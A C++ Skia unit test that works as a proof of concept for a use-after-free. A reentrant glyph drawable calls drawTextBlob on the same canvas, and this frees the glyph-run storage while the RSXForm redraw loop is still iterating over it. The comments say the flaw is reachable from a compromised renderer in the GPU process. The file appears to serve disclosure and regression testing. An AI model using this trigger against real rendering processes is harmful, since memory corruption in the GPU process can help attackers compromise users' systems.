/*
 * Copyright 2026 Google LLC.
 *
 * Use of this source code is governed by a BSD-style license that can be
 * found in the LICENSE file.
 */

// POC: Reentrant drawTextBlob via glyph drawable causes UAF in
// SkDevice::simplifyGlyphRunRSXFormAndRedraw.
//
// SkCanvas owns a single fScratchGlyphRunBuilder. drawTextBlob() populates the
// builder's std::vector<GlyphRun> fGlyphRunListStorage and returns a
// GlyphRunList whose SkSpan points into that vector. When the run list contains
// an RSXForm run, simplifyGlyphRunRSXFormAndRedraw iterates the span. If a
// glyph drawable drawn during that iteration calls canvas->drawTextBlob() on
// the *same* canvas, the builder is reused, fGlyphRunListStorage is cleared
// and (with enough new runs) reallocated. The outer range-for iterator then
// dereferences freed heap memory.
//
// In a real attack this is reachable from a compromised renderer in the GPU
// process via SkPictureBackedGlyphDrawable + SkCustomTypeface deserialization
// over the OOP-raster command buffer. This unit test constructs the same
// object graph programmatically against a raster SkSurface, which exercises
// the identical vulnerable loop in SkDevice.cpp.

#include "include/core/SkCanvas.h"
#include "include/core/SkDrawable.h"
#include "include/core/SkFont.h"
#include "include/core/SkFontMetrics.h"
#include "include/core/SkImageInfo.h"
#include "include/core/SkPaint.h"
#include "include/core/SkPath.h"
#include "include/core/SkRSXform.h"
#include "include/core/SkRefCnt.h"
#include "include/core/SkSurface.h"
#include "include/core/SkTextBlob.h"
#include "include/core/SkTypeface.h"
#include "include/utils/SkCustomTypeface.h"
#include "tests/Test.h"

namespace {

// A simple typeface with one path-based glyph. Used for the inner blob B2 and
// for the RSXForm run of B1, so that those runs do not themselves recurse.
sk_sp<SkTypeface> MakePathTypeface() {
  SkCustomTypefaceBuilder builder;
  SkFontMetrics metrics;
  sk_bzero(&metrics, sizeof(metrics));
  metrics.fTop = -1.0f;
  metrics.fAscent = -0.8f;
  metrics.fDescent = 0.2f;
  metrics.fBottom = 0.3f;
  metrics.fXMin = 0.0f;
  metrics.fXMax = 1.0f;
  builder.setMetrics(metrics);
  builder.setGlyph(0, 1.0f,
                   SkPath::Rect(SkRect::MakeLTRB(0.1f, -0.8f, 0.9f, 0.0f)));
  return builder.detach();
}

// Build the inner blob B2: many distinct runs so that blobToGlyphRunList(B2)
// forces fGlyphRunListStorage to grow past B1's capacity and reallocate,
// freeing the old heap buffer that the outer iterator still points into.
// (Each run uses a different font size so SkTextBlobBuilder cannot merge
// them into a single run.)
sk_sp<SkTextBlob> MakeInnerBlob(sk_sp<SkTypeface> tf) {
  SkTextBlobBuilder builder;
  for (int i = 0; i < 64; ++i) {
    SkFont font(tf, 8.0f + static_cast<float>(i));
    const auto& run = builder.allocRunPos(font, 1);
    run.glyphs[0] = 0;
    run.points()[0] = SkPoint::Make(0, 0);
  }
  return builder.make();
}

// Drawable that, when rendered as a glyph, reentrantly calls
// canvas->drawTextBlob() on the same SkCanvas. This mirrors what an
// SkRecordedDrawable deserialized from attacker-supplied bytes would do.
class ReentrantDrawable final : public SkDrawable {
 public:
  explicit ReentrantDrawable(sk_sp<SkTextBlob> inner)
      : inner_(std::move(inner)) {}

 protected:
  SkRect onGetBounds() override { return SkRect::MakeLTRB(0, -1, 1, 0); }
  void onDraw(SkCanvas* canvas) override {
    if (fired_) {
      return;
    }
    fired_ = true;
    // Reenter the same canvas's text pipeline. This call invokes
    // fScratchGlyphRunBuilder->blobToGlyphRunList(B2) which clears and
    // reallocates fGlyphRunListStorage while the outer
    // simplifyGlyphRunRSXFormAndRedraw loop is mid-iteration.
    SkPaint paint;
    canvas->drawTextBlob(inner_, 0, 0, paint);
  }

 private:
  sk_sp<SkTextBlob> inner_;
  bool fired_ = false;
};

// Typeface whose glyph 0 is the reentrant drawable.
sk_sp<SkTypeface> MakeDrawableTypeface(sk_sp<SkDrawable> drawable) {
  SkCustomTypefaceBuilder builder;
  SkFontMetrics metrics;
  sk_bzero(&metrics, sizeof(metrics));
  metrics.fTop = -1.0f;
  metrics.fAscent = -0.8f;
  metrics.fDescent = 0.2f;
  metrics.fBottom = 0.3f;
  metrics.fXMin = 0.0f;
  metrics.fXMax = 1.0f;
  builder.setMetrics(metrics);
  builder.setGlyph(0, 1.0f, std::move(drawable),
                   SkRect::MakeLTRB(0, -1, 1, 0));
  return builder.detach();
}

// Build the outer blob B1:
//   run0: kFull positioning, 1 glyph, font = drawable typeface @ size 400.
//         Large size makes ShouldDrawAsPath() true so the bitmap painter
//         takes the path/drawable branch and invokes the glyph drawable on
//         the live canvas.
//   run1: kRSXform positioning, 1 glyph. Its presence makes
//         glyphRunList.hasRSXForm() true so SkDevice::drawGlyphRunList
//         dispatches to simplifyGlyphRunRSXFormAndRedraw (the vulnerable
//         iterator).
sk_sp<SkTextBlob> MakeOuterBlob(sk_sp<SkTypeface> drawable_tf,
                                sk_sp<SkTypeface> path_tf) {
  SkTextBlobBuilder builder;

  SkFont font0(std::move(drawable_tf), 400.0f);
  {
    const auto& run = builder.allocRunPos(font0, 1);
    run.glyphs[0] = 0;
    run.points()[0] = SkPoint::Make(0, 0);
  }

  SkFont font1(std::move(path_tf), 20.0f);
  {
    const auto& run = builder.allocRunRSXform(font1, 1);
    run.glyphs[0] = 0;
    run.xforms()[0] = SkRSXform::Make(1, 0, 0, 0);
  }

  return builder.make();
}

DEF_TEST(SkiaGlyphRunUAF, reporter) {
  sk_sp<SkTypeface> path_tf = MakePathTypeface();
  sk_sp<SkTextBlob> inner = MakeInnerBlob(path_tf);
  sk_sp<SkDrawable> drawable = sk_make_sp<ReentrantDrawable>(std::move(inner));
  sk_sp<SkTypeface> drawable_tf = MakeDrawableTypeface(std::move(drawable));
  sk_sp<SkTextBlob> outer = MakeOuterBlob(std::move(drawable_tf), path_tf);

  sk_sp<SkSurface> surface =
      SkSurfaces::Raster(SkImageInfo::MakeN32Premul(1024, 1024));
  REPORTER_ASSERT(reporter, surface);
  SkCanvas* canvas = surface->getCanvas();

  SkPaint paint;
  // Triggers: onDrawTextBlob -> blobToGlyphRunList(B1) ->
  // simplifyGlyphRunRSXFormAndRedraw (iterating fGlyphRunListStorage) ->
  // [run0] drawGlyphRunList -> drawForBitmapDevice -> glyph drawable ->
  // ReentrantDrawable::onDraw -> drawTextBlob(B2) ->
  // blobToGlyphRunList(B2) -> prepareBuffers -> fGlyphRunListStorage
  // reallocated -> return to outer loop -> dereference freed run[1].
  canvas->drawTextBlob(outer, 100, 500, paint);
}

}  // namespace
